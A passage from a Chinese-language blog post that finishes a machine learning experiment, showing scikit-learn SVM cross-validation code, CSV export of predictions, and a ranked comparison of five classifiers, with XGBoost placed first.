<p>预测结果保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample prediction for csv file</span></span><br><span class="line">XGB.fit(X_train, y_train)<span class="comment">#training</span></span><br><span class="line">y_predict = XGB.predict(X_test)<span class="comment">#predicting</span></span><br><span class="line">XGBoost=pd.DataFrame(&#123;<span class="string">&#x27;y_test&#x27;</span>:y_test,<span class="string">&#x27;prediction&#x27;</span>:y_predict&#125;)<span class="comment">#df for camparison</span></span><br><span class="line">XGBoost.to_csv(<span class="string">&quot;XGBoost.csv&quot;</span>)<span class="comment">#export to csv     </span></span><br></pre></td></tr></table></figure>

<h4 id="3-6-支持向量机（Support-Vector-Machines）"><a href="#3-6-支持向量机（Support-Vector-Machines）" class="headerlink" title="3.6 支持向量机（Support Vector Machines）"></a>3.6 支持向量机（Support Vector Machines）</h4><p>具体代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#model</span></span><br><span class="line">SVM = SVC(kernel = <span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line"><span class="comment">#cross validation</span></span><br><span class="line">SVM_report = pd.DataFrame(cross_validate(SVM, X, y, scoring=scoring))</span><br><span class="line"><span class="comment">#getting required score methods</span></span><br><span class="line">SVM_report = SVM_report.iloc[:,<span class="number">2</span>:]</span><br><span class="line"><span class="comment">#naming the columns</span></span><br><span class="line">SVM_report.columns = scoring</span><br><span class="line"><span class="comment">#naming the index</span></span><br><span class="line">SVM_report.index = index</span><br><span class="line"></span><br><span class="line"><span class="comment">#final result collection</span></span><br><span class="line">model_5 = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#Classification report</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Clasification report:\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(SVM_report,<span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Mean Scores:\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> score <span class="keyword">in</span> scoring:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\t<span class="subst">&#123;score&#125;</span>: <span class="subst">&#123;<span class="built_in">round</span>(SVM_report[score].mean(),<span class="number">4</span>)&#125;</span>&quot;</span>)</span><br><span class="line">    model_5.append(<span class="built_in">round</span>(SVM_report[score].mean(),<span class="number">4</span>))</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><code>SVM = SVC(kernel = &#39;linear&#39;)</code>: 创建一个支持向量机的实例。这里使用的是线性核函数。</li>
<li><code>SVM_report = pd.DataFrame(cross_validate(SVM, X, y, scoring=scoring))</code>: 使用交叉验证来评估模型的性能。<code>cross_validate</code> 函数返回一个字典，其中包含每次交叉验证的结果。这个字典被转换成一个 DataFrame。</li>
<li><code>SVM_report = SVM_report.iloc[:,2:]</code>:选择 DataFrame 中的一部分列。</li>
<li><code>SVM_report.columns = scoring</code> 和 <code>SVM_report.index = index</code>: 设置DataFrame 的列名和行名。</li>
<li><code>model_5 = []</code>: 这行代码创建一个空列表，用于收集模型的平均分数。</li>
<li>最后，这段代码打印每个评分指标的结果，并计算它们的平均值。这些平均值被添加到了 <code>model_5</code> 列表中。</li>
</ol>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042320106.png" alt="image.png"></p>
<p>预测结果保存：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sample prediction for csv file</span></span><br><span class="line">SVM.fit(X_train, y_train)<span class="comment">#training</span></span><br><span class="line">y_predict = SVM.predict(X_test)<span class="comment">#predicting</span></span><br><span class="line">Support_Vector_Machines=pd.DataFrame(&#123;<span class="string">&#x27;y_test&#x27;</span>:y_test,<span class="string">&#x27;prediction&#x27;</span>:y_predict&#125;)<span class="comment">#df for camparison</span></span><br><span class="line">Support_Vector_Machines.to_csv(<span class="string">&quot;Support Vector Machines.csv&quot;</span>)<span class="comment">#export to csv     </span></span><br></pre></td></tr></table></figure>


<h1 id="四、实验结果"><a href="#四、实验结果" class="headerlink" title="四、实验结果"></a>四、实验结果</h1><p>通过上述步骤，获得了上述模型的相关性能，现在对它们进行比较，将它们并排显示，并比较不同模型的表现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Models = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">&#x27;Logistic Regression&#x27;</span>: np.array(model_1),</span><br><span class="line">    <span class="string">&#x27;Decision Tree&#x27;</span>: np.array(model_2),</span><br><span class="line">    <span class="string">&#x27;Random Forest&#x27;</span>: np.array(model_3),</span><br><span class="line">    <span class="string">&#x27;XGBoost&#x27;</span>: np.array(model_4),</span><br><span class="line">    <span class="string">&#x27;Support Vector Machines&#x27;</span>: np.array(model_5)&#125;)</span><br><span class="line">Models.index = scoring</span><br><span class="line"><span class="comment">#Models.sort_values(by=&#x27;Score&#x27;, ascending=False)</span></span><br><span class="line">Models</span><br></pre></td></tr></table></figure>
<p>输出：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042328667.png" alt="image.png"><br>由以上报告可以得出，在本数据集上，Logistic Regression模型以及XGBoost模型表现得较为优秀。</p>
<p>具体排名：<br><strong>ranking:</strong><br><strong>accuracy</strong> - 1. XGBoost 2. Logistic Regression 3. Random Forest 4. Decision Tree 5. Support Vector Machines</p>
<p><strong>precision</strong> - 1. XGBoost 2. Logistic Regression 3. Random Forest 4. Decision Tree 5. Support Vector Machines</p>
<p><strong>recall</strong> - 1. Logistic Regression 2. Random Forest 3. Decision Tree 4. XGBoost     5. Support Vector Machines  </p>
<p><strong>f1</strong> - 1. XGBoost 2. Logistic Regression 3. Random Forest 4. Decision Tree 5. Support Vector Machines</p>
<p><strong>final ranking:</strong></p>
<ol>
<li>XGBoost</li>
<li>Logistic Regression</li>
<li>Random Forest</li>
<li>Decision Tree</li>
<li>Support Vector Machines</li>
</ol>
<h1 id="五、实验分析"><a href="#五、实验分析" class="headerlink" title="五、实验分析"></a>五、实验分析</h1><p>此次实验，针对本数据集使用了多个模型进行训练以及评估，同时也采用了包括accuracy、precision、recall、f1等多种模型评估指标，使得本次实验的模型对比较为全面，也更为严谨。</p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>